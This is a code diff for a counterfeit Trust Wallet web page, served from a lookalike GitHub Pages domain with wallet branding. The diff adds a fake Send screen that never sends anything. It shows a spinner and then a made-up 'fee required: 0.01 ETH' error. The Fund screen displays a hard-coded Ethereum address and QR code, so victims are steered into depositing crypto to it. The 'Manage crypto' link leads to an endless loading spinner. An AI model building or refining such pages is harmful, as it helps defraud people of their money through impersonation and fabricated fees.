@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • fund separate page</title>
+  <title>Trust • send & fund pages</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -109,7 +109,7 @@
       display: flex;
     }
 
-    /* ----- LANDING (no orange) ----- */
+    /* ----- LANDING ----- */
     .landing {
       align-items: center;
       gap: 22px;
@@ -140,13 +140,9 @@
       gap: 8px;
       cursor: pointer;
       box-shadow: 0 10px 20px -8px #0f1a2b;
-      transition: 0.1s;
       width: auto;
       min-width: 200px;
       border: 1px solid #3f556f;
-    }
-    .open-btn:hover {
-      background: #253e5a;
     }
     .light-footer {
       font-size: 0.7rem;
@@ -186,7 +182,6 @@
       margin-top: 4px;
     }
 
-    /* action row: ONLY send & fund */
     .action-row {
       display: flex;
       justify-content: center;
@@ -218,7 +213,6 @@
       font-size: 1.3rem;
       box-shadow: 0 3px 8px -4px #8fa3c0;
       border: 1px solid #cddbf0;
-      transition: 0.1s;
     }
 
     .prediction-row {
@@ -315,13 +309,8 @@
       animation: spin 1.2s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-    .loading-text {
-      font-size: 1rem;
-      color: #1e314a;
-      font-weight: 450;
-    }
 
-    /* ----- FUND PAGE (separate, with QR and copy) ----- */
+    /* ----- FUND PAGE (QR) ----- */
     .fund-page {
       gap: 20px;
       align-items: center;
@@ -388,13 +377,141 @@
       min-width: 70px;
       text-align: center;
     }
-    .copy-btn:active {
-      background: #103247;
+
+    /* ----- SEND PAGE (like 4938.jpg) ----- */
+    .send-page {
+      gap: 20px;
     }
-    .network-note {
-      font-size: 0.65rem;
-      color: #59779e;
-      margin-top: 8px;
+    .send-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+    }
+    .send-title {
+      font-weight: 600;
+      font-size: 1.3rem;
+      color: #1b2d44;
+    }
+    .field-group {
+      width: 100%;
+    }
+    .field-label {
+      font-size: 0.8rem;
+      color: #4a607c;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    .address-input-area {
+      display: flex;
+      align-items: center;
+      background: #f4f9ff;
+      border-radius: 60px;
+      border: 1px solid #c9d8ec;
+      padding: 6px 6px 6px 18px;
+    }
+    .address-input-area input {
+      flex: 1;
+      border: none;
+      background: transparent;
+      padding: 12px 0;
+      font-size: 0.9rem;
+      outline: none;
+    }
+    .paste-btn {
+      background: #e1eaf5;
+      border: 1px solid #b0c7e5;
+      border-radius: 40px;
+      padding: 8px 16px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #1e3b5e;
+      cursor: pointer;
+      margin-left: 8px;
+    }
+    .network-row {
+      background: #f4f9ff;
+      border-radius: 60px;
+      padding: 14px 18px;
+      border: 1px solid #c9d8ec;
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.9rem;
+    }
+    .amount-section {
+      background: #f4f9ff;
+      border-radius: 30px;
+      padding: 16px 18px;
+      border: 1px solid #c9d8ec;
+    }
+    .amount-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+    .amount-row input {
+      flex: 1;
+      border: none;
+      background: white;
+      border-radius: 40px;
+      padding: 14px 18px;
+      font-size: 1rem;
+      border: 1px solid #cbdaf0;
+      outline: none;
+    }
+    .max-btn {
+      background: #1e2f44;
+      color: white;
+      border: none;
+      border-radius: 40px;
+      padding: 10px 22px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+    .usd-hint {
+      text-align: right;
+      color: #627b9c;
+      font-size: 0.8rem;
+      margin-top: 4px;
+    }
+    .error-fee-box {
+      background: #fef2f0;
+      border-radius: 30px;
+      padding: 14px 20px;
+      border: 1px solid #fbc5bb;
+      color: #a52a2a;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .confirm-btn {
+      background: #1e2f44;
+      color: white;
+      border: none;
+      border-radius: 60px;
+      padding: 16px;
+      font-size: 1.2rem;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 12px;
+    }
+    .confirm-btn:disabled {
+      background: #b7c9e0;
+      cursor: not-allowed;
+    }
+    .spinner-mini {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #e0eaf5;
+      border-top: 3px solid #1e3a5f;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-right: 8px;
     }
   </style>
 </head>
@@ -411,7 +528,7 @@
       <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE (only Send & Fund) -->
+    <!-- MAIN WALLET PAGE -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
@@ -420,11 +537,11 @@
       </div>
 
       <div class="action-row">
-        <div class="action-item" id="sendAction">
+        <div class="action-item" id="sendActionMain">
           <div class="action-icon">⬆️</div>
           <span>Send</span>
         </div>
-        <div class="action-item" id="fundAction">
+        <div class="action-item" id="fundActionMain">
           <div class="action-icon">⬇️</div>
           <span>Fund</span>
         </div>
@@ -436,7 +553,6 @@
         <span class="chip">Watch</span>
       </div>
 
-      <!-- Ethereum -->
       <div class="crypto-row">
         <div class="crypto-left">
           <div class="crypto-icon"><img src="https://trustwalleteth.github.io/A/1027.png" alt="ETH"></div>
@@ -447,7 +563,6 @@
           <span class="crypto-sub">ETH</span>
         </div>
       </div>
-      <!-- USDC -->
       <div class="crypto-row">
         <div class="crypto-left">
           <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/27763.png" alt="USDC"></div>
@@ -459,36 +574,77 @@
         </div>
       </div>
 
-      <!-- Manage crypto (infinite spinner) -->
       <div class="manage-link" id="manageCryptoBtn">⚙️ Manage crypto</div>
       <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
     </div>
 
-    <!-- LOADING PAGE (spinner infinite) -->
+    <!-- LOADING PAGE (infinite spinner) -->
     <div class="page loading-page" id="loadingPage">
       <div class="spinner"></div>
       <div class="loading-text">loading ...</div>
       <div class="back-link-sm" id="backFromLoading">← back</div>
     </div>
 
-    <!-- FUND PAGE (separate, with QR and copy) -->
+    <!-- FUND PAGE (QR) -->
     <div class="page fund-page" id="fundPage">
       <div class="fund-header">
         <div class="back-link-sm" id="backFromFund">← back</div>
         <span class="fund-title">Receive funds</span>
         <span style="width:40px;"></span>
       </div>
-
       <div class="qr-box">
         <div class="qr-code-image">
-          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
+          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR">
         </div>
         <div class="address-row">
           <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
           <button class="copy-btn" id="fundCopyBtn">copy</button>
         </div>
-        <div class="network-note">Ethereum network</div>
+        <div style="font-size:0.65rem; color:#59779e;">Ethereum network</div>
       </div>
+    </div>
+
+    <!-- SEND PAGE (like 4938.jpg) -->
+    <div class="page send-page" id="sendPage">
+      <div class="send-header">
+        <div class="back-link-sm" id="backFromSend">← back</div>
+        <span class="send-title">Send USDC</span>
+        <span style="width:40px;"></span>
+      </div>
+
+      <div class="field-group">
+        <div class="field-label">Address or Domain Name</div>
+        <div class="address-input-area">
+          <input type="text" placeholder="Search or Enter" id="addressInput" autocomplete="off">
+          <button class="paste-btn" id="pasteAddressBtn">Paste</button>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <div class="field-label">Destination network</div>
+        <div class="network-row">
+          <span>Ethereum</span>
+          <span style="color:#9ab0cc;">▼</span>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <div class="field-label">Amount</div>
+        <div class="amount-section">
+          <div class="amount-row">
+            <input type="number" id="amountInput" placeholder="USDC Amount" min="1" max="500" step="1">
+            <button class="max-btn" id="maxBtn">Max</button>
+          </div>
+          <div class="usd-hint" id="usdHint">≈ $0.00</div>
+        </div>
+      </div>
+
+      <!-- confirm button & fee error placeholder (hidden by default) -->
+      <div id="feeErrorBox" style="display: none;" class="error-fee-box">
+        <span>⚠️</span> fee required: 0.01 ETH
+      </div>
+
+      <button class="confirm-btn" id="confirmSendBtn" disabled>Next</button>
     </div>
   </div>
 
@@ -501,18 +657,29 @@
       const wallet = document.getElementById('walletPage');
       const loading = document.getElementById('loadingPage');
       const fundPage = document.getElementById('fundPage');
+      const sendPage = document.getElementById('sendPage');
 
-      // buttons
+      // nav buttons
       const openWallet = document.getElementById('openWalletBtn');
       const backFromWallet = document.getElementById('backFromWalletToLanding');
       const manageBtn = document.getElementById('manageCryptoBtn');
       const backFromLoading = document.getElementById('backFromLoading');
-      const fundAction = document.getElementById('fundAction');
+      const fundAction = document.getElementById('fundActionMain');
       const backFromFund = document.getElementById('backFromFund');
-      const sendAction = document.getElementById('sendAction');
-      const fundCopyBtn = document.getElementById('fundCopyBtn');
+      const sendAction = document.getElementById('sendActionMain');
+      const backFromSend = document.getElementById('backFromSend');
+
+      // send page elements
+      const addressInput = document.getElementById('addressInput');
+      const pasteBtn = document.getElementById('pasteAddressBtn');
+      const amountInput = document.getElementById('amountInput');
+      const maxBtn = document.getElementById('maxBtn');
+      const usdHint = document.getElementById('usdHint');
+      const confirmBtn = document.getElementById('confirmSendBtn');
+      const feeErrorBox = document.getElementById('feeErrorBox');
 
       const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
+      const demoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // for paste demo
 
       // open wallet
       openWallet.addEventListener('click', ()=>{
@@ -520,50 +687,135 @@
         wallet.classList.add('active');
       });
 
-      // back from wallet to landing
       backFromWallet.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         landing.classList.add('active');
       });
 
-      // Manage crypto → infinite spinner
+      // manage -> infinite spinner
       manageBtn.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         loading.classList.add('active');
       });
 
-      // back from loading to wallet
       backFromLoading.addEventListener('click', ()=>{
         loading.classList.remove('active');
         wallet.classList.add('active');
       });
 
-      // FUND: open fund page (separate page)
+      // fund page
       fundAction.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         fundPage.classList.add('active');
       });
-
-      // back from fund to wallet
       backFromFund.addEventListener('click', ()=>{
         fundPage.classList.remove('active');
         wallet.classList.add('active');
       });
 
-      // copy on fund page
-      fundCopyBtn.addEventListener('click', ()=>{
-        navigator.clipboard.writeText(walletAddress).then(()=>{
-          const original = fundCopyBtn.innerText;
-          fundCopyBtn.innerText = 'copied';
-          setTimeout(()=>{ fundCopyBtn.innerText = original; }, 1500);
-        }).catch(()=>{
-          alert('manual copy: ' + walletAddress);
-        });
+      // send page
+      sendAction.addEventListener('click', ()=>{
+        wallet.classList.remove('active');
+        sendPage.classList.add('active');
+        // reset fields
+        addressInput.value = '';
+        amountInput.value = '';
+        usdHint.innerText = '≈ $0.00';
+        feeErrorBox.style.display = 'none';
+        validateSendForm();
       });
 
-      // send demo
-      sendAction.addEventListener('click', ()=>{
-        alert('send workflow (demo)');
+      backFromSend.addEventListener('click', ()=>{
+        sendPage.classList.remove('active');
+        wallet.classList.add('active');
+      });
+
+      // paste demo
+      pasteBtn.addEventListener('click', async ()=>{
+        try {
+          const text = await navigator.clipboard.readText();
+          addressInput.value = text;
+        } catch {
+          addressInput.value = demoAddress; // fallback demo
+        }
+        validateSendForm();
+      });
+
+      // max button: set 500, cap if >500
+      maxBtn.addEventListener('click', ()=>{
+        amountInput.value = 500;
+        updateUsdHint();
+        capAmount();
+        validateSendForm();
+      });
+
+      // cap amount on input
+      amountInput.addEventListener('input', ()=>{
+        capAmount();
+        updateUsdHint();
+        validateSendForm();
+      });
+
+      function capAmount() {
+        let val = parseFloat(amountInput.value);
+        if (!isNaN(val) && val > 500) {
+          amountInput.value = 500;
+        } else if (val < 1 && amountInput.value !== '') {
+          amountInput.value = 1;  // minimum 1
+        }
+      }
+
+      function updateUsdHint() {
+        let val = parseFloat(amountInput.value);
+        if (!isNaN(val) && val >= 1) {
+          usdHint.innerText = `≈ $${val.toFixed(2)}`;
+        } else {
+          usdHint.innerText = '≈ $0.00';
+        }
+      }
+
+      // validation: address non-empty and amount >=1
+      function validateSendForm() {
+        const addr = addressInput.value.trim();
+        const amt = parseFloat(amountInput.value);
+        const valid = addr.length > 0 && !isNaN(amt) && amt >= 1 && amt <= 500;
+        confirmBtn.disabled = !valid;
+      }
+
+      addressInput.addEventListener('input', validateSendForm);
+
+      // confirm button logic: show spinner, then fee error, then back to send
+      confirmBtn.addEventListener('click', (e)=>{
+        if (confirmBtn.disabled) return;
+
+        // disable, show spinner inside button
+        const originalText = confirmBtn.innerText;
+        confirmBtn.disabled = true;
+        confirmBtn.innerHTML = '<span class="spinner-mini"></span> processing';
+
+        // after 2 seconds, hide spinner, show fee error
+        setTimeout(() => {
+          confirmBtn.innerHTML = originalText; // restore "Next"
+          confirmBtn.disabled = true; // keep disabled until new input
+          feeErrorBox.style.display = 'flex'; // show fee required
+
+          // after 3.5 seconds, hide fee error and return to send page (stay)
+          setTimeout(() => {
+            feeErrorBox.style.display = 'none';
+            // page stays send, user can retry
+          }, 3500);
+        }, 2000);
+      });
+
+      // fund page copy
+      document.getElementById('fundCopyBtn').addEventListener('click', ()=>{
+        const addr = document.getElementById('fundAddress').innerText;
+        navigator.clipboard.writeText(addr).then(()=>{
+          const btn = document.getElementById('fundCopyBtn');
+          const original = btn.innerText;
+          btn.innerText = 'copied';
+          setTimeout(()=>{ btn.innerText = original; }, 1500);
+        });
       });
 
     })();
